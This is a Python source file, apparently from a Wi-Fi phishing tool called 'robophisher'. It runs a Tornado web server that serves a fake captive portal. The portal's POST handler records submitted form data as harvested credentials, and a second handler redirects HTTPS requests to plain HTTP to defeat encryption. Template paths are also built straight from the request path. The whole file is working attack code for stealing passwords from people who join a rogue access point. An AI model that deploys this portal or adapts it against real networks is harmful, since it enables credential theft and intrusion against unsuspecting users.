import logging
import json
from tornado.escape import json_decode
import tornado.ioloop
import tornado.web
import os.path
import robophisher.common.uimethods as uimethods
import robophisher.common.extensions as extensions
import robophisher.common.constants as constants

hn = logging.NullHandler()
hn.setLevel(logging.DEBUG)
logging.getLogger('tornado.access').disabled = True
logging.getLogger('tornado.general').disabled = True

template = False
terminate = False
creds = []
logger = logging.getLogger(__name__)


class DowngradeToHTTP(tornado.web.RequestHandler):
    def get(self):
        self.redirect("http://10.0.0.1:8080/")


class CaptivePortalHandler(tornado.web.RequestHandler):
    def get(self):
        """
        Override the get method

        :param self: A tornado.web.RequestHandler object
        :type self: tornado.web.RequestHandler
        :return: None
        :rtype: None
        """

        requested_file = self.request.path[1:]
        template_directory = template

        # choose the correct file to serve
        if os.path.isfile(template_directory + requested_file):
            render_file = requested_file
        else:
            render_file = "index.html"

        context = {
            'target_ap_channel': "",
            'target_ap_essid': "",
            'target_ap_bssid': "",
            'target_ap_encryption': "",
            'target_ap_vendor': "",
            'target_ap_logo_path': "",
            "firmware_version": "1.0.12",
            "organization": ""
        }
        # load the file
        file_path = template_directory + render_file
        self.render(file_path, **context)

        # record the GET request in the logging file
        logger.info("GET request from %s for %s", self.request.remote_ip, self.request.full_url())
        print(u"{} \u25C0 {}".format(self.request.remote_ip, self.request.full_url()))

    def post(self):
        """
        Override the post method

        :param self: A tornado.web.RequestHandler object
        :type self: tornado.web.RequestHandler
        :return: None
        :rtype: None
        ..note: we only serve the Content-Type which starts with
        "application/x-www-form-urlencoded" as a valid post request
        """

        global terminate

        # check the http POST request header contains the Content-Type
        try:
            content_type = self.request.headers["Content-Type"]
        except KeyError:
            return

        # check if this is a valid phishing post request
        if content_type.startswith(constants.VALID_POST_CONTENT_TYPE):
            post_data = tornado.escape.url_unescape(self.request.body)
            # record the post requests in the logging file
            logger.info("POST request from %s with %s", self.request.remote_ip, post_data)

            creds.append(post_data)
            terminate = True

            print(u"{} \u25B6 {}".format(self.request.remote_ip, post_data))

        requested_file = self.request.path[1:]
        template_directory = template

        # choose the correct file to serve
        if os.path.isfile(template_directory + requested_file):
            render_file = requested_file
        else:
            render_file = "index.html"
        context = {
            'target_ap_channel': "",
            'target_ap_essid': "",
            'target_ap_bssid': "",
            'target_ap_encryption': "",
            'target_ap_vendor': "",
            'target_ap_logo_path': "",
            "firmware_version": "1.0.12",
            "organization": ""
        }
        # load the file
        file_path = template_directory + render_file
        self.render(file_path, **context)


def runHTTPServer(ip, port, ssl_port, t):
    global template
    template = t

    app = tornado.web.Application(
        [
            (r"/.*", CaptivePortalHandler),
        ],
        template_path=template,
        static_path=template + "static/",
        compiled_template_cache=False)
    app.listen(port, address=ip)

    ssl_app = tornado.web.Application([(r"/.*", DowngradeToHTTP)])
    https_server = tornado.httpserver.HTTPServer(
        ssl_app, ssl_options={
            "certfile": constants.PEM,
            "keyfile": constants.PEM,
        })
    https_server.listen(ssl_port, address=ip)

    tornado.ioloop.IOLoop.instance().start()
